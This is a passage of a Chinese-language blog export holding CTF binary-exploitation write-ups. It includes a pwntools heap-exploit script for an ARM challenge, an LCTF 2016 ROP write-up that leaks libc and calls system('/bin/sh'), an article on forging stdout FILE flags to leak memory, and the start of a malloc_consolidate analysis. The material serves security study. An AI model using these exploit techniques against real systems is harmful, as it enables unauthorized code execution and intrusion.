content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    context.binary = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;172.16.9.45&quot;</span>, <span class="number">11410</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">        p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./vuln&quot;</span>])</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/usr/arm-linux-gnueabihf/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./vuln&quot;</span>])</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/usr/arm-linux-gnueabihf/lib/libc.so.6&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x34</span>, <span class="string">&#x27;0&#x27;</span> * <span class="number">0x34</span>) <span class="comment">#0</span></span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x34</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x34</span>) <span class="comment">#1</span></span><br><span class="line">    add(p, <span class="string">&#x27;/bin/sh\x00&#x27;</span>, <span class="number">0x34</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">    add(p, <span class="string">&#x27;/bin/sh\x00&#x27;</span>, <span class="number">0x34</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x34</span>, <span class="string">&#x27;4&#x27;</span> * <span class="number">0x34</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    edit(p, <span class="number">0</span>, <span class="string">&#x27;sunichi&#x27;</span>, <span class="string">&#x27;0&#x27;</span> * <span class="number">0x34</span> + chr(<span class="number">0x28</span>+<span class="number">0x38</span>+<span class="number">0x28</span>+<span class="number">0x38</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x8</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">4</span>) <span class="comment">#1</span></span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x8</span> * <span class="number">4</span>, <span class="string">&#x27;5&#x27;</span> * <span class="number">4</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">    show(p, <span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;5555&#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">4</span>)</span><br><span class="line">    libc.address = u32(recv) - <span class="number">88</span>/<span class="number">2</span> - <span class="number">0x18</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x470</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">666</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;exchange the libc address with bss address\n&#x27;</span>, str(libc.symbols[<span class="string">&#x27;malloc&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;your bss address &#x27;</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    elf.address = int(recv, <span class="number">16</span>) - <span class="number">0x12090</span></span><br><span class="line">    <span class="keyword">print</span> hex(elf.address) </span><br><span class="line">    </span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x8</span>, <span class="string">&#x27;6&#x27;</span> * <span class="number">4</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x8</span>, <span class="string">&#x27;7&#x27;</span> * <span class="number">0x8</span>) <span class="comment">#7</span></span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x44</span>, <span class="string">&#x27;8&#x27;</span> * <span class="number">0x44</span>) <span class="comment">#8</span></span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x44</span>, <span class="string">&#x27;9&#x27;</span> * <span class="number">0x44</span>) <span class="comment">#9</span></span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x44</span>, <span class="string">&#x27;10&#x27;</span> * (<span class="number">0x44</span>/<span class="number">2</span>)) <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">    edit(p, <span class="number">4</span>, <span class="string">&#x27;sunichi&#x27;</span>, <span class="string">&#x27;4&#x27;</span> * <span class="number">0x34</span> + <span class="string">&#x27;\xa9&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#payload = p32(0) * 3 + p32(0x29) + p32(0) + p32(0x69) + p32(0) * 24 + p32(0x68)</span></span><br><span class="line">    payload = <span class="string">&#x27;s&#x27;</span> * <span class="number">0x7c</span></span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x7c</span>, payload) <span class="comment">#7</span></span><br><span class="line">    payload = p32(<span class="number">0</span>) * <span class="number">3</span> + p32(<span class="number">0x29</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x69</span>) + p32(elf.address + <span class="number">0x12090</span> + <span class="number">0x20</span> - <span class="number">12</span>) + p32(elf.address + <span class="number">0x12090</span> + <span class="number">0x20</span> - <span class="number">8</span>)</span><br><span class="line">    payload += p32(<span class="number">0</span>) * <span class="number">22</span> + p32(<span class="number">0x68</span>) + chr(<span class="number">0x28</span>+<span class="number">0x48</span>+<span class="number">0x28</span>)</span><br><span class="line">    edit(p, <span class="number">7</span>, <span class="string">&#x27;sunichi&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x7c</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x7c</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x7c</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x7c</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    add(p, <span class="string">&#x27;sunichi&#x27;</span>, <span class="number">0x7c</span>, <span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = p32(elf.address + <span class="number">0x12090</span><span class="number">-4</span>) + p32(<span class="number">0</span>) + p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">    edit(p, <span class="number">8</span>, payload,  <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    edit(p, <span class="number">5</span>, <span class="string">&#x27;sunichi&#x27;</span>, p32(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> hex(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    <span class="keyword">print</span> hex(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>hwb</tag>
        <tag>arm</tag>
        <tag>mips</tag>
      </tags>
  </entry>
  <entry>
    <title>lctf 2016 pwn100 writeup</title>
    <url>/2018/01/07/lctf16-pwn100/</url>
    <content><![CDATA[<p>使用ida查看程序，在函数<code>0x40063d</code>中有<code>read</code>函数，读取用户输入的200个字节。接着调用<code>puts</code>函数输出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_40063D((__int64)&amp;v1, <span class="number">200</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;bye~&quot;</span>);</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<p>存储用户输入的空间为0x40字节，所以用户输入会导致溢出。由于是64位程序，因此需要gadget来控制流。x64中，主要使用<code>__libc_csu_init</code>中的两段代码来进行参数传递和函数调用，这两段代码分别位于0x400740和0x40075a。</p>
<p>由于无libc，需要泄漏，通过pattern和rsp可知偏移为72：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">72</span> + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * (<span class="number">200</span> - len(payload))</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;~\n&#x27;</span>)</span><br><span class="line">    prev_rv = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        rv = p.recv(numb = <span class="number">1</span>, timeout = <span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> prev_rv == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> rv == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            data = data[:<span class="number">-1</span>]</span><br><span class="line">            data += <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data += rv</span><br><span class="line">        prev_rv = rv</span><br><span class="line">    data = data[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>

<p>获取<code>system</code>函数地址后，只需要将<code>/bin/sh</code>写入再调用<code>system</code>函数即可，通过<code>vmmap</code>可知0x601000-0x602000可读/写：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">72</span> + p64(<span class="number">0x40075a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">8</span>) + p64(<span class="number">0x601000</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x400740</span>) <span class="comment">#0、1两个参数固定，0配合第二段代码的call，由于是call指令第三个参数用got，随后是read函数的三个参数，返回0x400740调用第二段代码</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span> + p64(start_addr) <span class="comment">#栈指针移动了56字节，填充56字节</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span> * (<span class="number">200</span> - len(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;~\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">72</span> + p64(pop_rdi) + p64(<span class="number">0x601000</span>) + p64(system_addr) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span> * (<span class="number">200</span> - len(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p>参考文章和bin下载：<a href="https://www.anquanke.com/post/id/85129">https://www.anquanke.com/post/id/85129</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2016</tag>
        <tag>lctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Leak From Stdout</title>
    <url>/2018/11/29/leak-from-stdout/</url>
    <content><![CDATA[<p>在最近的一些题目中，多次运用到了修改<code>stdout</code>的<code>FILE</code>结构体中的缓冲区指针进行信息泄漏，参考了大佬们阅读源代码的博客，记录一下。</p>
<a id="more"></a>

<p>以下是三个涉及<code>FILE</code>的主要结构体：</p>
<ul>
<li><code>_IO_FILE_plus</code>结构体：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from libioP.h in glibc</span></span><br><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>_IO_FILE</code>结构体：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from /usr/include/libio.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;           <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>_IO_jump_t</code>结构体：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>以下是<code>FILE</code>结构体进行输出时的相关代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from fileops.c in glibc</span></span><br><span class="line"><span class="keyword">int</span> _IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF) <span class="comment">// 攻击者想到执行到的代码位置</span></span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure>

<p>从代码中可以看出，如果想要执行<code>return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</code>并尽可能减少其他不必要的代码执行，就需要满足下列三个条件：</p>
<ul>
<li><code>f-&gt;_flags &amp; _IO_NO_WRITES == 0</code></li>
<li><code>(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0</code></li>
<li><code>f-&gt;_IO_write_base != 0</code></li>
</ul>
<p>下面来看<code>_IO_do_write</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from fileops.c in glibc</span></span><br><span class="line"><span class="keyword">int</span> _IO_new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 实际调用new_do_write函数</span></span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> _IO_size_t <span class="title">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING) <span class="comment">//需要使这个if成立</span></span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123; <span class="comment">//fp-&gt;_IO_write_base - fp-&gt;_IO_read_end非常大，如果read被置为0</span></span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// fp=stdout data=stdout-&gt;_IO_write_base to_do=f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</span></span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="comment">// 重置write的指针</span></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  </span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以需要满足下列四个条件：</p>
<ul>
<li><code>f-&gt;_flags &amp; _IO_NO_WRITES == 0</code></li>
<li><code>(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0</code></li>
<li><code>f-&gt;_IO_write_base != 0</code></li>
<li><code>fp-&gt;_flags &amp; _IO_IS_APPENDING != 0</code></li>
</ul>
<p>进而能够调用<code>_IO_SYSWRITE (fp, data, to_do)</code>即</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_SYSWRITE (<span class="built_in">stdout</span>, <span class="built_in">stdout</span>-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base)</span><br></pre></td></tr></table></figure>

<p>所以需要将<code>flag</code>设置为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad0000</span>  <span class="comment">// Magic number</span></span><br><span class="line">_flags &amp; = ~_IO_NO_WRITES <span class="comment">// _flags = 0xfbad0000</span></span><br><span class="line">_flags | = _IO_CURRENTLY_PUTTING <span class="comment">// _flags = 0xfbad0800</span></span><br><span class="line">_flags | = _IO_IS_APPENDING <span class="comment">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考文章：</p>
<p><a href="https://vigneshsrao.github.io/babytcache/">https://vigneshsrao.github.io/babytcache/</a></p>
<p><a href="http://tacxingxing.com/2018/02/09/fsp/">http://tacxingxing.com/2018/02/09/fsp/</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>file</tag>
      </tags>
  </entry>
  <entry>
    <title>ptmalloc malloc_consolidate分析</title>
    <url>/2018/06/04/ptmalloc-malloc_consolidate/</url>
    <content><![CDATA[<p>尝试做了下suCTF2018的noend，用到的泄漏的libc地址的方法之前未遇到过，顺带对<code>malloc_consolidate</code>的源代码进行了学习。</p>
<p>以下分析基于glibc-2.23进行。</p>
<a id="more"></a>

<p>在<code>free</code>中，当达到某些条件的时候，会调用<code>malloc_consolidate</code>进行fastbin的chunk的合并。</p>
<p>首先，函数检查prev_chunk是否处于使用中，如果空闲，进行合并。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -(<span class="keyword">long</span>)prevsize);</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果下一个chunk不是<code>top_chunk</code>，进行如下操作：</p>
<ul>
<li>如果next_chunk空闲，合并next_chunk</li>
<li>如果next_chunk使用中，将next_chunk的prev_inuse位置为0</li>
</ul>
<p>接着将本chunk放入unsorted bin中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">unsorted_bin-&gt;fd = p;</span><br><span class="line">first_unsorted-&gt;bk = p;</span><br></pre></td></tr></table></figure>

<p>如果本chunk不在small bin范围内，清空fd_nextsize和bk_nextsize。接着设置本chunk的属性：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">set_head(p, size | PREV_INUSE);</span><br><span class="line">p-&gt;bk = unsorted_bin;</span><br><span class="line">p-&gt;fd = first_unsorted;</span><br><span class="line">set_foot(p, size);</span><br></pre></td></tr></table></figure>

<p>如果下一个chunk是<code>top_chunk</code>，进行合并：</p>
